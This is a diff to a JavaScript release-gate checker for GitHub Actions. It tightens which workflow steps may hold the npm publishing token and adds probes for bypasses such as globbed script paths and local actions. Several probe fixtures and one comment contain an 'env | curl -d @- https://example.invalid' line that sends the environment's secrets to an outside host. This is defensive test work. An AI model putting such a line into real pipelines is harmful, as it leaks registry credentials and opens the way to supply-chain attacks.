@@ -185,6 +185,24 @@ export function checkReleaseTrigger(text, label = WORKFLOW) {
   return problems;
 }
 
+/**
+ * No npm script may reach a publisher. `npm run <name>` is a run-text form the workflow rules cannot
+ * follow (REL3 pass 4, reducer), so the indirection is closed at the other end: the root manifest's
+ * scripts may not name the publishing scripts at all. Every real invocation is an exact `node …` step.
+ */
+export function checkNoIndirectPublishScripts(rootPkg, label = 'package.json') {
+  const problems = [];
+  for (const [name, body] of Object.entries(rootPkg?.scripts ?? {})) {
+    if (typeof body !== 'string') continue;
+    for (const script of ['publish-latest.mjs', 'publish-derived-set.mjs']) {
+      if (body.includes(script)) {
+        problems.push(`${label} script \`${name}\` runs ${script} — \`npm run ${name}\` would reach a publisher from any job, past every rule that names the script`);
+      }
+    }
+  }
+  return problems;
+}
+
 export function checkPublishingCallersDelegate(workflows, payloadText = null) {
   const problems = [];
   // The ceiling the payload actually declares, not a constant hoping to match it.
@@ -229,6 +247,17 @@ export function checkPublishingCallersDelegate(workflows, payloadText = null) {
         // so a step running it anywhere but release.yml's tag-triggered `release` job — the rc payload
         // included — claims the prod channel, irreversibly. The `npm publish` text match above cannot
         // see it, which is how a branch-triggered job running it passed every gate.
+        // …AND THE NAME MUST BE LITERAL (REL3 pass 4, reducer). The test above reads the run's
+        // text, so `node scripts/publish-lat*.mjs` — which the shell expands to the same file —
+        // matched nothing. Any `node scripts/…` argument carrying a glob or a quote is refused
+        // outright, in every workflow and every job: no honest step needs one, and a path the
+        // gate cannot read literally is a path it cannot confine.
+        for (const m of inline.matchAll(/(?:^|[\s;|&(])node\s+(\S+)/g)) {
+          const arg = m[1];
+          if (arg.includes('scripts/') && /[*?[\]"'\\]/.test(arg)) {
+            problems.push(`${file} job \`${jobName}\` runs \`node ${arg}\` — a script path with a glob or a quote cannot be read literally, so no rule that names a script can confine it`);
+          }
+        }
         if (/publish-latest\.mjs(?!\s*--selftest)/.test(inline) && !(file === '.github/workflows/release.yml' && jobName === 'release')) {
           problems.push(
             `${file} job \`${jobName}\` runs scripts/publish-latest.mjs, which publishes \`latest\` — only ` +
@@ -680,24 +709,21 @@ function checkAttestation(wf, jobName, steps, label, stripShellComments) {
   //   - checkout keeps no credentials;
   //   - every `npx` runs the lockfile's copy (`--no-install`), never something fetched at release time;
   //   - the verify step pins which workflow, on which commit, signed the attestation.
-  // WHO MAY HOLD THE TOKEN, by the run's exact text, not by a name appearing in it: a
-  // substring test was satisfied by `echo publish-latest.mjs` in front of anything (REL3 pass 3).
-  // The registry scripts only as their exact runs; one shell step besides, the dist-tag report,
-  // and only if it names `npm dist-tag ls` outside a comment. That last test is textual and does
-  // not try to parse the shell (REL2: shell pattern-matching never converges); what it bounds is
-  // the COUNT — one shell step, not any number.
-  const TOKEN_SCRIPT_RUN = /^node scripts\/(bump-prerelease\.mjs --from-registry|publish-derived-set\.mjs|publish-latest\.mjs|verify-published-integrity\.mjs)$/;
-  const DIST_TAG_REPORT = /(^|[\s"'$(;&|])npm\s+dist-tag\s+ls\b/;
+  // WHO MAY HOLD THE TOKEN, by the run's exact text, not by a name appearing in it: a substring
+  // test was satisfied by `echo publish-latest.mjs` in front of anything (REL3 pass 3). NO SHELL
+  // STEP MAY HOLD IT AT ALL (REL3 pass 4, reducer): the dist-tag report was the one exception, and
+  // bounding how many such steps there were could not bound what they did — appending
+  // `env | curl -d @- …` to it passed every rule, because the exfiltration never names the
+  // variable. The report is now scripts/report-dist-tags.mjs, so the exception is gone.
+  const TOKEN_SCRIPT_RUN = /^node scripts\/(bump-prerelease\.mjs --from-registry|publish-derived-set\.mjs|publish-latest\.mjs|verify-published-integrity\.mjs|report-dist-tags\.mjs)$/;
   for (const [where, env] of [['job', wf?.jobs?.[jobName]?.env], ['workflow', wf?.env]]) {
     if (env && typeof env === 'object' && 'NODE_AUTH_TOKEN' in env) {
       problems.push(`${label} sets NODE_AUTH_TOKEN at ${where} level — it must reach only the steps that talk to the registry`);
     }
   }
-  let reportHolders = 0;
   for (const st of steps) {
     if (st.env && typeof st.env === 'object' && 'NODE_AUTH_TOKEN' in st.env && !TOKEN_SCRIPT_RUN.test(runOf(st).trim())) {
-      if (DIST_TAG_REPORT.test(runOf(st))) reportHolders++;
-      else problems.push(`${label} step "${st.name ?? runOf(st).trim().slice(0, 40)}" holds NODE_AUTH_TOKEN but is neither an exact registry-script run nor the dist-tag report`);
+      problems.push(`${label} step "${st.name ?? runOf(st).trim().slice(0, 40)}" holds NODE_AUTH_TOKEN but is not an exact registry-script run`);
     }
     for (const inv of runOf(st).split(/&&|\|\||;|\n/)) {
       // `npx` anywhere in the command (including inside `$( … )` or backticks), and `npm exec`: both
@@ -716,7 +742,15 @@ function checkAttestation(wf, jobName, steps, label, stripShellComments) {
       problems.push(`${label} step "${st.name ?? runOf(st).trim().slice(0, 40)}" names NODE_AUTH_TOKEN in its run — it could re-export the token to every later step`);
     }
   }
-  if (reportHolders > 1) problems.push(`${label} has ${reportHolders} shell steps holding NODE_AUTH_TOKEN — only the one dist-tag report may`);
+  // A LOCAL ACTION IS A HOLE IN EVERY RULE ABOVE (REL3 pass 4, reviewer). All of them read this
+  // workflow's step text; `uses: ./.github/actions/x` runs steps written somewhere else, in a job
+  // that holds `id-token: write`. Third-party actions are SHA-pinned and covered by
+  // check-action-pins.sh; a local one is refused outright on a publishing path.
+  for (const st of steps) {
+    if (typeof st.uses === 'string' && st.uses.trim().startsWith('./')) {
+      problems.push(`${label} step "${st.name ?? st.uses}" runs a local action (\`${st.uses.trim()}\`) — its steps are outside every rule this gate applies to the publishing job`);
+    }
+  }
   const checkouts = steps.filter((st) => typeof st.uses === 'string' && /^actions\/checkout@/.test(st.uses.trim()));
   if (checkouts.length === 0) problems.push(`${label} has no actions/checkout step to hold to persist-credentials: false`);
   for (const st of checkouts) {
@@ -838,12 +872,11 @@ export function checkWorkflowUsesDerivedSet(
     // Renata M18: deleting the dist-tag report survived every gate for three passes. Non-`latest`
     // tags never appear in the GitHub web UI, so this step is the ONLY place an operator can see
     // that the publish landed — which makes it evidence, not decoration.
-    // ANCHORED ON THE ASSIGNMENT, not the bare command. My own fix introduced the defeat: the new
-    // `echo "::error::$NAME: npm dist-tag ls exited $RC"` satisfies a bare `/npm\s+dist-tag\s+ls/`,
-    // so the real invocation could be deleted and the error message alone kept the gate green.
-    // That is the prose-satisfies-the-guard class this file closed two passes ago, reintroduced by
-    // the very line meant to make the report honest.
-    [/OUT="\$\(npm\s+dist-tag\s+ls/, 'the published dist-tag report'],
+    // REL3 pass 4: the report is a script, so this is a presence test over its name and the
+    // EXACT-step list below is what makes the name mean the invocation. The previous anchor read
+    // `OUT="$(npm dist-tag ls`, because with the report written in shell a bare
+    // `/npm\s+dist-tag\s+ls/` was satisfied by its own `echo "::error::… npm dist-tag ls …"`.
+    [/report-dist-tags\.mjs/, 'the published dist-tag report'],
   ];
   const REQUIRED_STEPS = jobName === 'release' ? [...PROD_ONLY_STEPS, ...EVERY_STREAM_STEPS] : EVERY_STREAM_STEPS;
   for (const [re, what] of REQUIRED_STEPS) {
@@ -896,6 +929,7 @@ export function checkWorkflowUsesDerivedSet(
     // REL3 (#364): the tarballs that get attested and published, and the post-publish byte check.
     'node scripts/pack-derived-set.mjs',
     'node scripts/verify-published-integrity.mjs',
+    'node scripts/report-dist-tags.mjs',
     ...(jobName === 'release' ? ['node scripts/publish-latest.mjs'] : []),
   ]) {
     const own = steps.filter((st) => typeof st.run === 'string' && stripShellComments(st.run).trim() === exact);
@@ -1354,7 +1388,7 @@ jobs:
       - name: Security
         run: bash scripts/npm-audit-gate.sh
       - name: Report
-        run: OUT="$(npm dist-tag ls "@spec-kitty/tokens" 2>/tmp/e)"
+        run: node scripts/report-dist-tags.mjs
       - name: Resolve the publishable package set
         id: graph
         run: |
@@ -1447,7 +1481,7 @@ const REUSABLE_PAYLOAD_FIXTURE = `jobs:
       - name: Security
         run: bash scripts/npm-audit-gate.sh
       - name: Report
-        run: OUT="$(npm dist-tag ls "@spec-kitty/tokens" 2>/tmp/e)"
+        run: node scripts/report-dist-tags.mjs
       - name: Bump
         run: node scripts/bump-prerelease.mjs --from-registry
       - name: Pack
@@ -1519,14 +1553,15 @@ const withCallerDefect = (anchor, withText) => {
 
 // Set from the table's own reported count, never from arithmetic — see the floor's own comment
 // in selftest(). Raise it in the SAME commit that adds probes.
-// LOWERED 123 -> 116, DELIBERATELY (then back up as probes were added: 118 with two order probes the
-// adjacency rule had masked, and more for publish-latest.mjs's confinement and the npx/npm-exec rules). Ten probes policed the prod publish's inline shell loop
+// HISTORY, because the number moved both ways and a stale headline on this comment was itself a
+// review finding (REL3 pass 4): 123 -> 116 deliberately, then up as probes were added — 118, 125,
+// 130, 136, 143, and now 145. Ten probes policed the prod publish's inline shell loop
 // (FILES source, reassignment, `read`, a second loop, the loop variable, a directory publish, a bare
 // publish, a missing `--tag latest`, an appended path, the loop's list). REL3 review showed that surface
 // could not be closed by rules over shell text, so the loop was replaced by scripts/publish-latest.mjs,
 // whose own effect probes cover those behaviours by running it. Three probes here hold the workflow to
 // that script (inline publish refused, `|| true` refused, the loop restored refused).
-const PROBE_FLOOR = 136;
+const PROBE_FLOOR = 145;
 
 const VALID_RELEASE_TRIGGER = "on:\n  push:\n    tags: ['v*.*.*']\n";
 const withTrigger = (from, to) => {
@@ -1535,6 +1570,10 @@ const withTrigger = (from, to) => {
 };
 
 const PROBES = [
+  { what: 'REL3: an npm script that reaches the prod publisher', run: () => checkNoIndirectPublishScripts({ scripts: { release: 'node scripts/publish-latest.mjs' } }) },
+  { what: 'REL3: an npm script that reaches the rc publisher', run: () => checkNoIndirectPublishScripts({ scripts: { rc: 'nx build && node scripts/publish-derived-set.mjs' } }) },
+  { what: 'REL3: a glob in a node script path (the shell expands it, the gate cannot read it)', run: () => checkPublishingCallersDelegate([{ file: '.github/workflows/nightly.yml', text: 'on:\n  push:\n    branches: [develop]\njobs:\n  n:\n    runs-on: ubuntu-latest\n    steps:\n      - run: node scripts/publish-lat*.mjs\n' }, { file: '.github/workflows/release-rc.yml', text: VALID_CALLER_FIXTURE }]) },
+  { what: 'REL3: a quoted split in a node script path', run: () => checkPublishingCallersDelegate([{ file: '.github/workflows/nightly.yml', text: 'on:\n  push:\n    branches: [develop]\njobs:\n  n:\n    runs-on: ubuntu-latest\n    steps:\n      - run: node scripts/publish-lat"est".mjs\n' }, { file: '.github/workflows/release-rc.yml', text: VALID_CALLER_FIXTURE }]) },
   { what: 'REL3: release.yml also triggered by workflow_dispatch', run: () => withTrigger('on:\n', 'on:\n  workflow_dispatch:\n') },
   { what: 'REL3: release.yml push trigger gains a branches filter', run: () => withTrigger("    tags: ['v*.*.*']\n", "    tags: ['v*.*.*']\n    branches: [main]\n") },
   { what: 'REL3: release.yml tag filter loosened to any tag', run: () => withTrigger("tags: ['v*.*.*']", "tags: ['*']") },
@@ -1932,13 +1971,21 @@ const PROBES = [
       // REL3 pass 3: rules that existed with no probe, and the token-holder rule tightened from a substring test.
       release('the token on a step that merely NAMES a registry script', '      - name: Pack\n', '      - name: Sneak\n        env:\n          NODE_AUTH_TOKEN: x\n        run: echo node scripts/publish-latest.mjs && env | curl -d @- https://example.invalid\n      - name: Pack\n'),
       release('the token on a registry script run with extra words', '      - name: Pack\n', '      - name: Sneak\n        env:\n          NODE_AUTH_TOKEN: x\n        run: node scripts/verify-published-integrity.mjs; env | curl -d @- https://example.invalid\n      - name: Pack\n'),
-      release('a second shell step holding the token beside the dist-tag report', '      - name: Report\n        run: OUT=', '      - name: Report\n        env:\n          NODE_AUTH_TOKEN: x\n        run: npm dist-tag ls x\n      - name: Report again\n        env:\n          NODE_AUTH_TOKEN: x\n        run: OUT='),
+      release('a shell step holding the token, even one that really runs the dist-tag report', '      - name: Report\n', '      - name: Shell report\n        env:\n          NODE_AUTH_TOKEN: x\n        run: npm dist-tag ls "@spec-kitty/tokens" && env | curl -d @- https://example.invalid\n      - name: Report\n'),
+      release('the dist-tag report chained behind another command', '        run: node scripts/report-dist-tags.mjs', '        run: node scripts/report-dist-tags.mjs || true'),
+      release('the dist-tag report echoed instead of run', '        run: node scripts/report-dist-tags.mjs', '        run: echo node scripts/report-dist-tags.mjs'),
+      release('the dist-tag report behind an `if:`', '      - name: Report\n', '      - name: Report\n        if: always()\n'),
       release('no checkout step at all (nothing to hold to persist-credentials: false)', '      - uses: actions/checkout@34e114876b0b11c390a56381ad16ebd13914f8d5\n        with: { fetch-depth: 0, persist-credentials: false }\n', ''),
       release('NODE_AUTH_TOKEN at workflow level', 'permissions:\n  contents: write\n', 'env:\n  NODE_AUTH_TOKEN: x\npermissions:\n  contents: write\n'),
       release('the verify step without GH_TOKEN', '          GH_TOKEN: ${{ github.token }}\n', ''),
+      release('a local composite action in the release job', '      - name: Pack\n', '      - name: Local\n        uses: ./.github/actions/helper\n      - name: Pack\n'),
+      payload('a local composite action in the payload job', '      - name: Pack\n', '      - name: Local\n        uses: ./.github/actions/helper\n      - name: Pack\n'),
       {
         what: 'REL3 caller: a branch-triggered workflow running publish-latest.mjs (claims latest)',
-        run: () => checkPublishingCallersDelegate([{ file: '.github/workflows/nightly.yml', text: 'on:\n  push:\n    branches: [develop]\njobs:\n  n:\n    runs-on: ubuntu-latest\n    steps:\n      - run: node scripts/pack-derived-set.mjs\n      - run: node scripts/publish-latest.mjs\n' }]),
+        // WITH A DELEGATING CALLER IN THE FIXTURE (REL3 pass 4, reducer and reviewer both): a
+        // single-file fixture also trips "no workflow delegates to the reusable publish workflow",
+        // so this probe tripped with the confinement rule deleted — it proved nothing.
+        run: () => checkPublishingCallersDelegate([{ file: '.github/workflows/nightly.yml', text: 'on:\n  push:\n    branches: [develop]\njobs:\n  n:\n    runs-on: ubuntu-latest\n    steps:\n      - run: node scripts/pack-derived-set.mjs\n      - run: node scripts/publish-latest.mjs\n' }, { file: '.github/workflows/release-rc.yml', text: VALID_CALLER_FIXTURE }]),
       },
       {
         what: 'REL3 caller: the rc payload file running publish-latest.mjs',
@@ -2385,8 +2432,8 @@ function selftest() {
     ['REUSABLE_PAYLOAD_FIXTURE', () => checkWorkflowUsesDerivedSet(REUSABLE_PAYLOAD_FIXTURE, ['@spec-kitty/tokens'], ['tokens'], 'publish', 'publish-packages.yml')],
     ['VALID_CALLER_FIXTURE', () => checkPublishingCallersDelegate([{ file: 'release-rc.yml', text: VALID_CALLER_FIXTURE }])],
     ['VALID_RELEASE_TRIGGER', () => checkReleaseTrigger(VALID_RELEASE_TRIGGER, 'release.yml')],
-    // The token-holder rule must not over-refuse: the one dist-tag report holding the token is clean.
-    ['VALID_RELEASE_WORKFLOW, report holding the token', () => checkWorkflowUsesDerivedSet(withDefect('      - name: Report\n        run: OUT=', '      - name: Report\n        env:\n          NODE_AUTH_TOKEN: x\n        run: OUT='), ['@spec-kitty/tokens'], ['tokens'], 'release', 'release.yml')],
+    // The token-holder rule must not over-refuse: the report script holding the token is clean.
+    ['VALID_RELEASE_WORKFLOW, report holding the token', () => checkWorkflowUsesDerivedSet(withDefect('      - name: Report\n        run: node scripts/report-dist-tags.mjs', '      - name: Report\n        env:\n          NODE_AUTH_TOKEN: x\n        run: node scripts/report-dist-tags.mjs'), ['@spec-kitty/tokens'], ['tokens'], 'release', 'release.yml')],
   ];
   for (const [name, run] of baselines) {
     const dirt = run();
@@ -2464,6 +2511,7 @@ function main() {
     // second unguarded.
     ...checkWorkflowUsesDerivedSet(readFileSync(join(ROOT, WORKFLOW), 'utf8'), pkgs.map((p) => p.name), pkgs.map((p) => p.dir), 'release', WORKFLOW),
     ...checkReleaseTrigger(readFileSync(join(ROOT, WORKFLOW), 'utf8')),
+    ...checkNoIndirectPublishScripts(JSON.parse(readFileSync(join(ROOT, 'package.json'), 'utf8'))),
     ...(existsSync(join(ROOT, REUSABLE_WORKFLOW))
       ? checkWorkflowUsesDerivedSet(
           readFileSync(join(ROOT, REUSABLE_WORKFLOW), 'utf8'),
